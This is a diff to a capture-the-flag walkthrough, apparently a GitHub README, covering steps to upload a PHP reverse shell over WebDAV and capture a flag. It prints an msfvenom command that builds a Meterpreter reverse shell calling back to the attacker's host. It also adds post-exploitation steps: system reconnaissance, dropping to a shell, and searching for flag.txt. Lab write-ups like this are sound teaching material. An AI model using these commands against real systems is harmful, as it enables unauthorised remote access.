@@ -92,7 +92,7 @@ Connect to the VM's WebDAV directory by following the instructions on the secret
 <details>
 <summary> <b> Step 5: Upload a PHP reverse shell payload. </b> </summary>
 
-- Using MSFVenom, we will set up a reverse shell, the command: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php
+- Using MSFVenom, we will set up a reverse shell, the command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php`
 
 ![image](https://github.com/user-attachments/assets/d355def3-8daf-40bd-854d-9a28a6bd45e1)
 
@@ -113,3 +113,24 @@ Connect to the VM's WebDAV directory by following the instructions on the secret
 
 ![image](https://github.com/user-attachments/assets/a94f2ef2-fcfa-446c-815c-b545be30338e)
 </details>
+
+
+<details>
+<summary> <b> Step 6: Find and capture the flag </b> </summary>
+  
+Once a Meterpreter shell is open you can run the following commands like getuid, getwd, sysinfo to gather dditional information about the hacked system. If you type shell the terminal will change to shell and then you can run additional commands such as finding files etc.
+  
+- On the listener, we will search for the flag found inside the root directory, which is named flag.txt
+  - Run command: `shell`
+  - locate `flag.txt`
+  - `cat /flag.txt`
+
+Note: Another way instead of jumping through files would be to: `find -name flag.txt 2>/dev/null` Here `2>dev/null` is instructing to ignore any error messages while searching.
+![image](https://github.com/user-attachments/assets/3185fc42-d926-4f33-822b-0ba845715063)
+
+
+
+
+</details>
+
+
